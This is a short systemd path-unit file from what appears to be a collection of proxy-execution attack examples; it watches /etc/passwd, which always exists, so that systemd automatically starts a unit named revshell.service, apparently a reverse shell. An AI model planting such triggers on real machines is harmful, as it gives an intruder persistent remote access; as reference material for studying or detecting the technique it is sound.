# Examples/ProxyExecution/execshell.path
; https://www.freedesktop.org/software/systemd/man/systemd.path.html
[Path]
PathExists=/etc/passwd
Unit=revshell.service
